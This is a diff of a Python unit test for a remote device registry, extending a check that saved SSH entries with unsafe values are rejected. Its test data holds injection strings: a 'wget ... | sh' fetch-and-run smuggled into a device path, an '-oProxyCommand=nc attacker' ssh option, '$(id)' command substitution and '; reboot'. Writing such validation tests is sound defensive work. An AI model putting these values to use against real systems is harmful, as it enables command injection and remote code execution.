@@ -13,7 +13,7 @@ from pydantic import ValidationError
 
 import app.dut.registry as registry_mod
 from app.api.fleet_api import RemoteNodeBody, capture_rssi, configure_node
-from app.dut.registry import DutRegistry
+from app.dut.registry import REMOTE_PORT_MAX, DutRegistry
 from app.parser.sysmon_parser import SysMonParser
 from app.serial.serial_worker import SSH_CAPTURE_TIMEOUT_SEC, SerialWorker
 
@@ -68,16 +68,25 @@ class RemoteRegistryTests(unittest.TestCase):
                 self.assertNotIn("key_path", public)
                 self.assertNotIn("user", public)
 
-    def test_a_persisted_device_and_iface_are_held_to_the_api_shapes(self) -> None:
-        """duts.json is the weaker gate otherwise, and both values reach a shell."""
-        for bad in (
-            {**REMOTE, "device": "/tmp/x ; wget http://host/x -O- | sh"},
-            {**REMOTE, "device": "/dev/../tmp/x"},
-            {**REMOTE, "backhaul_iface": "ath0; reboot"},
+    def test_a_persisted_entry_is_held_to_the_api_shapes(self) -> None:
+        """duts.json is the weaker gate otherwise, and these values reach ssh
+        as arguments or a shell as a command string."""
+        for label, bad in (
+            ("shell metacharacters in device", {**REMOTE, "device": "/tmp/x ; wget http://h/x -O- | sh"}),
+            ("traversal in device", {**REMOTE, "device": "/dev/../tmp/x"}),
+            ("shell metacharacters in iface", {**REMOTE, "backhaul_iface": "ath0; reboot"}),
+            # A leading "-" would reach ssh as an option, not as a name.
+            ("option-like user", {**REMOTE, "user": "-oProxyCommand=nc attacker 1234"}),
+            ("option-like host", {**REMOTE, "host": "-oProxyCommand=id"}),
+            ("space in user", {**REMOTE, "user": "dut root"}),
+            ("command substitution in host", {**REMOTE, "host": "$(id)"}),
+            ("port above the range", {**REMOTE, "port": 65536}),
+            ("port below the range", {**REMOTE, "port": 0}),
         ):
-            with self.subTest(device=bad["device"], iface=bad["backhaul_iface"]):
+            with self.subTest(case=label):
                 self.assertIsNone(registry_mod._clean_remote(bad))
         self.assertEqual(registry_mod._clean_remote(dict(REMOTE)), REMOTE)
+        self.assertIsNotNone(registry_mod._clean_remote({**REMOTE, "port": REMOTE_PORT_MAX}))
 
     def test_load_persisted_merges_and_never_clears_a_live_remote(self) -> None:
         """A saved entry from before the node had an SSH console must not wipe it."""
